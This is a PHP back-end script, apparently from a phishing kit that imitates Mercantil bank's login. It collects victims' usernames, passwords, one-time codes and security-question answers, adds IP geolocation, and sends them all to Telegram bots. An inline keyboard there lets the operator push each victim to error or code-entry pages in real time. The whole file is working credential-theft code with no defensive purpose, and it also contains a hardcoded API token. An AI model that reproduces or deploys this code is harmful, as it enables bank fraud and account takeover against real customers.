<?php
// 🚫 Ocultar errores
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// ✅ Usar ID existente si viene, si no generar uno nuevo
$id_existente = $_GET['id'] ?? $_POST['id'] ?? null;
if ($id_existente) {
    $request_id = basename($id_existente); // seguridad
} else {
    $request_id = bin2hex(random_bytes(16)); // 32 caracteres aleatorios
}

// Usar el ID como ID de sesión
session_id($request_id);
session_start();

require_once 'config.php';

// 🚫 Bloqueo de IPs maliciosas
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);
$ips_bloqueadas = ["---", "OTRO_IP_BLOQUEADO"];

if (in_array($user_ip, $ips_bloqueadas)) {
    http_response_code(403);
    exit;
}

// 📍 Función segura para obtener geolocalización
function get_ip_info($user_ip) {
    if (!filter_var($user_ip, FILTER_VALIDATE_IP)) {
        return [];
    }
    $token = 'e8764d0b0d51b0'; // Reemplaza con tu token de ipinfo.io
    $url = "https://ipinfo.io/{$user_ip}/json?token={$token}";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 4
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true) ?: [];
}
$locationData = get_ip_info($user_ip);
$cc     = $locationData['country'] ?? 'No disponible';
$city   = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

// 📂 Crear carpeta requests si no existe
if (!file_exists('requests')) {
    @mkdir('requests', 0777, true);
}

$form_origen = "desconocido";
$message = "";

// =====================
// Captura de formularios
// =====================

// index.php
if (isset($_POST['usr']) && isset($_POST['clv'])) {
    $_SESSION['usuario'] = trim($_POST['usr']);
    $pas = trim($_POST['clv']);
    $form_origen = "index.php";
    $message .= "🇻🇪『𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅 𝖠𝖼𝖼𝖾𝗌𝗈』🇻🇪\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  `" . $_SESSION['usuario'] . "`\n";
    $message .= "🔐┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$pas`\n";

// index-error.php
} elseif (isset($_POST['usr2']) && isset($_POST['clv2'])) {
    $_SESSION['usuario'] = trim($_POST['usr2']);
    $pas = trim($_POST['clv2']);
    $form_origen = "index-error.php";
    $message .= "🇻🇪『𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅 𝖠𝖼𝖼𝖾𝗌𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  `" . $_SESSION['usuario'] . "`\n";
    $message .= "🔐┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$pas`\n";

// temporal.php
} elseif (isset($_POST['cod'])) {
    $cod = trim($_POST['cod']);

    // ✅ Recuperar usuario si no está en sesión
    if (empty($_SESSION['usuario']) && !empty($_POST['id'])) {
        $old_file = "requests/" . basename($_POST['id']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    $form_origen = "temporal.php";
    $message .= "🇻🇪『𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅』🇻🇪\n\n";
    $message .= "📲┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$cod`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// temporal-error.php
} elseif (isset($_POST['cod2'])) {
    $cod2 = trim($_POST['cod2']);

    // ✅ Recuperar usuario si no está en sesión
    if (empty($_SESSION['usuario']) && !empty($_POST['id'])) {
        $old_file = "requests/" . basename($_POST['id']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    $form_origen = "temporal-error.php";
    $message .= "🇻🇪『𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "📲┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$cod2`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// preguntas.php
} elseif (isset($_POST['prg']) && isset($_POST['prg2'])) {
    if (empty($_SESSION['usuario']) && isset($_POST['id_anterior'])) {
        $old_file = "requests/" . basename($_POST['id_anterior']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }
    $q1 = trim($_POST['prg']);
    $q2 = trim($_POST['prg2']);
    $form_origen = "preguntas.php";
    $message .= "🇻🇪『𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺𝗌 𝖽𝖾 𝖲𝖾𝗀𝗎𝗋𝗂𝖽𝖺𝖽』🇻🇪\n\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 1.:  `$q1`\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 2.:  `$q2`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// preguntas-error.php
} elseif (isset($_POST['prg_error']) && isset($_POST['prg2_error'])) {
    if (empty($_SESSION['usuario']) && isset($_POST['id_anterior'])) {
        $old_file = "requests/" . basename($_POST['id_anterior']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    // Mantener el ID original para redirección en error
    $id_original = basename($_POST['id_anterior'] ?? '');

    // Validar respuestas
    $q1e = trim($_POST['prg_error']);
    $q2e = trim($_POST['prg2_error']);
    $form_origen = "preguntas-error.php";
    $message .= "🇻🇪『𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺𝗌 𝖽𝖾 𝖲𝖾𝗀𝗎𝗋𝗂𝖽𝖺𝖽-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 1.:  `$q1e`\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 2.:  `$q2e`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

    // Verifica el archivo original para evaluar las respuestas
    $file = "requests/$id_original.json";
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        $resp1_valida = $data['question1'] ?? '';
        $resp2_valida = $data['question2'] ?? '';

        if ($q1e !== $resp1_valida || $q2e !== $resp2_valida) {
            // ❌ Redirige al error con el mismo ID
            header("Location: preguntas-error.php?id=" . urlencode($id_original));
            exit;
        }
    }
} else {
    http_response_code(400);
    exit;
}

// 📌 Añadir geolocalización
$message .= "\n🌎┆⬩ 𝖴𝖻𝗂𝖼𝖺𝖼𝗂𝗈𝗇: $cc - $region - $city\n";
$message .= "🌐┆⬩ 𝖨𝖯: $user_ip\n";

// 📁 Guardar estado en archivo
$request_file = "requests/$request_id.json";
$prev_data = file_exists($request_file) ? (json_decode(file_get_contents($request_file), true) ?: []) : [];
$request_data = array_merge($prev_data, [
    'usuario' => $_SESSION['usuario'] ?? 'Desconocido',
    'estado'  => null
]);
file_put_contents($request_file, json_encode($request_data));

// 🎛 Teclado en Telegram
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '〘🍀〙 𝖫𝗈𝗀𝗂𝗇', 'callback_data' => "redir:$request_id:index.php"],
            ['text' => '〘🚨〙 𝖫𝗈𝗀𝗂𝗇 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
        ],
        [
            ['text' => '〘🍀〙 𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅', 'callback_data' => "redir:$request_id:temporal.php"],
            ['text' => '〘🚨〙 𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:temporal-error.php"]
        ],
        [
            ['text' => '〘✏️〙 𝖯𝖾𝗋𝗌𝗈𝗇𝖺𝗅𝗂𝗓𝖺𝗋 𝗉𝗋𝖾𝗀𝗎𝗇𝗍𝖺𝗌', 'callback_data' => "custom:$request_id"]
        ],
        [
            ['text' => '〘🚨〙 𝖯𝗋𝖾𝗀𝗎𝗇𝗍𝖺𝗌 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:preguntas-error.php"]
        ],
        [
            ['text' => '〘🏁〙 𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
        ]
    ]
];

// 📤 Enviar a Telegram
foreach ($telegram_accounts as $account) {

    $url = "https://api.telegram.org/bot{$account['token']}/sendMessage";

    $payload = [
        'chat_id' => $account['chat_id'],
        'text' => $message,
        'reply_markup' => json_encode($keyboard),
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);

    curl_exec($ch);
    curl_close($ch);
}

// 🔄 Redirigir a loader con el id actual
header("Location: load.php?id=" . urlencode($request_id));
exit;
?>
